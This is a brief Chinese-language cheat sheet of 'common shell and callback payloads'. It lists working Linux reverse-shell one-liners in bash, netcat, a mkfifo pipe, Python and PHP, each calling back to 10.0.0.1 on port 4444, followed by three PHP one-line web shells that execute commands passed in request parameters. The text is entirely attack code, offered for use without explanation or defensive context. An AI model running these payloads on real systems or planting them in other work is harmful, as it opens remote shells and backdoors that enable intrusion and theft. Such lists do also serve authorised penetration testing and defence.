# 常用Shell及回连Payload

## 反弹Shell（Linux）

```bash
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'
nc -e /bin/sh 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## WebShell (PHP一行)
```php
<?php system($_GET['cmd']); ?>
<?php eval($_POST['x']); ?>
<?=`$_GET[cmd]`?>
```